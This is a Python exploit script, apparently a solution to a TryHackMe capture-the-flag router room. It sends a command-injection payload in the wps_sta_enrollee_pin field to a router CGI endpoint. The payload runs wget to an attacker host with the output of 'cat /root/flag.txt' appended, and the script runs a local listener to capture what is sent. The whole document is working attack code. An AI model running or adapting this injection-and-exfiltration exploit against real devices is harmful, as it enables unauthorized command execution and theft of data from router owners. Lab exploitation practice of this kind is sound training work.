import requests
import threading
import http.server
import socketserver
import re
import sys

# --- CONFIGURATION ---
TARGET_IP = ""   # Replace with the Royal Router VM IP
ATTACKER_IP = "" # Replace with your THM AttackBox/VPN IP
LPORT = 80                # Port for your local python web server
# ---------------------

class FlagExfiltrator(http.server.SimpleHTTPRequestHandler):
    """
    Custom HTTP handler to capture the flag from the GET request 
    initiated by the router's wget command.
    """
    def do_GET(self):
        # The router will request a path containing the flag: /THM{...}
        print(f"\n[+] Incoming connection from {self.client_address[0]}")
        
        # Search for the THM flag pattern in the requested URL path
        match = re.search(r'THM\{.*\}', self.path)
        if match:
            print(f"[*] EXFILTRATED FLAG: {match.group(0)}")
        else:
            print(f"[*] Received Path: {self.path}")

        # Send a standard response to satisfy the target's wget
        self.send_response(200)
        self.end_headers()

    def log_message(self, format, *args):
        # Suppress standard logs to keep the output clean
        return

def start_server():
    """Starts the listener to catch the exfiltrated data."""
    handler = FlagExfiltrator
    with socketserver.TCPServer(("", LPORT), handler) as httpd:
        print(f"[*] Local server listening on {ATTACKER_IP}:{LPORT}...")
        # Handle exactly one request (the one containing the flag)
        httpd.handle_request()

def trigger_exploit():
    """Sends the command injection payload to the vulnerable endpoint."""
    url = f"http://{TARGET_IP}/set_sta_enrollee_pin.cgi"
    
    # Payload: uses command substitution $() to execute 'cat /root/flag.txt' 
    # and appends the result to the wget URL.
    payload = f"`wget http://{ATTACKER_IP}:{LPORT}/$(cat /root/flag.txt)`"
    
    data = {
        "html_response_page": "do_wps_save.asp",
        "html_response_return_page": "do_wps.asp",
        "reboot_type": "none",
        "wps_pin_radio": "0",
        "wps_sta_enrollee_pin": payload
    }

    print(f"[*] Sending payload to {url}...")
    try:
        # We use a timeout because the router may not respond while executing wget
        requests.post(url, data=data, timeout=5)
    except requests.exceptions.RequestException:
        pass

if __name__ == "__main__":
    if "x.x" in TARGET_IP or "x.x" in ATTACKER_IP:
        print("[-] Error: Please update the TARGET_IP and ATTACKER_IP in the script.")
        sys.exit(1)

    # 1. Start the exfiltration listener in a background thread
    listener = threading.Thread(target=start_server)
    listener.daemon = True
    listener.start()

    # 2. Trigger the vulnerability
    trigger_exploit()

    # 3. Wait for the listener to catch the flag
    listener.join(timeout=10)
    print("[*] Script execution finished.")
